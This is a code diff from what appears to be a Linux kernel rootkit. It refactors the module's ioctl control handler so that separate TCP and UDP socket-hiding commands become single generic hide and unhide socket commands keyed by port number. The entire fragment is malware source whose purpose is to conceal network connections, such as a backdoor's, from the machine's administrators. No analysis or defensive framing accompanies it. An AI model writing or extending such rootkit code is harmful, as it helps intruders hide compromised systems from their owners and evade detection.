@@ -124,42 +124,22 @@ static long ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
             }
             return ret;
 
-        case RKCTL_TCP_HIDE:
+        case RKCTL_HIDE_SOCKET:
 
             /*
-             *
+             * Hide socket
              */
-            if (0 > (ret = hide_socket((unsigned short) arg, PROTO_TCP))) {
+            if (0 > (ret = hide_socket((unsigned short) arg))) {
                 return -EINVAL;
             }
             return ret;
 
-        case RKCTL_TCP_UNHIDE:
+        case RKCTL_UNHIDE_SOCKET:
 
             /*
-             *
+             * Unhide socket
              */
-            if (0 > (ret = unhide_socket((unsigned short) arg, PROTO_TCP))) {
-                return -EINVAL;
-            }
-            return ret;
-
-        case RKCTL_UDP_HIDE:
-
-            /*
-             *
-             */
-            if (0 > (ret = hide_socket((unsigned short) arg, PROTO_UDP))) {
-                return -EINVAL;
-            }
-            return ret;
-
-        case RKCTL_UDP_UNHIDE:
-
-            /*
-             *
-             */
-            if (0 > (ret = unhide_socket((unsigned short) arg, PROTO_UDP))) {
+            if (0 > (ret = unhide_socket((unsigned short) arg))) {
                 return -EINVAL;
             }
             return ret;
